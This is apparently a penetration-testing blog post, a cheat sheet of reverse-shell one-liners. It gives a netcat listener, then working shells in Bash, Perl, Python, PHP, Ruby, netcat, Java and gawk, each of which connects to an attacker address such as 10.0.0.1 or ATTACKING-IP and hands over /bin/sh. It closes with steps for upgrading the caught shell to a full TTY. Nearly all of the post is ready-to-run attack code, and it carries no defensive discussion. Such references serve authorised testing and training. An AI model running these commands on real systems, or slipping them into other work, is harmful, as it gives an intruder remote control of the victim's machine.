---
layout: post
title:  "Reverse Shells Cheat Sheet"
categories: [cheatsheet, offensive_security]
tags: [ offensive security, cheat sheet, reverse shell, backdoor, bash, perl, python, PHP]
---

This list represent an comprehensive cheat sheet of shells and other related stuff.


## Listening
To setup a listening netcat instance, enter the following:

```terminal
sudo nc -nvlp 80
```

## Reverse Shells

To connect back to a listening netcat instance, enter the following:

#### Bash

```terminal
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

#### PERL

```terminal
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### PERL Windows 1

```terminal
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

#### Python

```terminal
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

```terminal
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Ruby

```terminal
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat

```terminal
nc -e /bin/sh 10.0.0.1 1234
```

#### Java

```terminal
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### Gawk Reverse Shell

```terminal
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Spawning interactive reverse shells with TTY

```terminal
# In reverse shell 
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Attacker console
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

## Sources

- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e